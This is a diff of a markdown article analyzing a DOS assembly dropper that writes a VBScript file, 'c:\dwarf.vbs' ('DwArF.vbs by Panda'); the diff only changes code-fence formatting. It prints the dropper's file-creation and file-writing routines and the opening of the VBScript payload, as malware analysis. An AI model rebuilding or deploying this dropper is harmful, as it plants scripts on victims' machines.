@@ -5,9 +5,7 @@ This article analyzes a piece of assembly code that acts as a simple dropper, cr
 
 **1. Initial Interaction and Choice (DEBUT to TOUCHE)**
 
-Extrait de code
-
-```
+```assembly
 DEBUT :        mov ah,09h          ;affiche un message
               lea dx,text1         ;avec deux proposition
               int 21h
@@ -36,9 +34,7 @@ TOUCHE:       mov ah,1            ;lecture du caractère
 
 **2. File Creation (CREER_FICHIER)**
 
-Extrait de code
-
-```
+```assembly
 CREER_FICHIER: mov ah,3Ch          ;CREE UN FICHIER
               xor cx,cx
               mov dx,offset NOM    ;ET LUI DONNE UN NOM
@@ -53,9 +49,7 @@ CREER_FICHIER: mov ah,3Ch          ;CREE UN FICHIER
 
 **3. Writing to the File (ECRIRE_FICHIER)**
 
-Extrait de code
-
-```
+```assembly
 ECRIRE_FICHIER: xchg ax,bx
               mov ah,40h          ;ECRIT DANS LE FICHIER
               mov cx,meslen
@@ -73,9 +67,7 @@ ECRIRE_FICHIER: xchg ax,bx
 
 **4. Closing the File (FERMER_FICHIER)**
 
-Extrait de code
-
-```
+```assembly
 FERMER_FICHIER: mov ah,3Eh          ;PUIS LE REFERME
               int 21h
 
@@ -85,9 +77,7 @@ FERMER_FICHIER: mov ah,3Eh          ;PUIS LE REFERME
 
 **5. Directory Change (Unnecessary)**
 
-Extrait de code
-
-```
+```assembly
               mov dx,offset updir   ;CHANGEMENT DE REPERTOIRE 
               mov ah,3Bh
               int 21h
@@ -98,9 +88,7 @@ Extrait de code
 
 **6. Displaying a Message (MESSAGE)**
 
-Extrait de code
-
-```
+```assembly
 MESSAGE:      mov ah,09h          ;AFFICHE LE MESSAGE
               lea dx,msg
               int 21h
@@ -111,9 +99,7 @@ MESSAGE:      mov ah,09h          ;AFFICHE LE MESSAGE
 
 **7. Program Termination (FIN_PROGRAMME)**
 
-Extrait de code
-
-```
+```assembly
 FIN_PROGRAMME : mov ah,4Ch          ;FERME LE PROGRAMME
               int 21h
 
@@ -123,9 +109,7 @@ FIN_PROGRAMME : mov ah,4Ch          ;FERME LE PROGRAMME
 
 **8. Data Definitions**
 
-Extrait de code
-
-```
+```assembly
 text1  db 10,13,'Tape C pour continuer ou Q pour quitter : $'
 bad    db 7,7,8,' ',8,24h
 NOM    db 'c:\dwarf.vbs',0
@@ -157,9 +141,7 @@ end DEBUT
 
 Let's examine the VBScript code that gets written to `c:\dwarf.vbs`:
 
-VBScript
-
-```
+```vbscript
 rem DwArF.vbs by Panda (c) 2000
 Dim WSHShell
 Set WSHShell = Wscript.CreateObject("WScript.Shell")
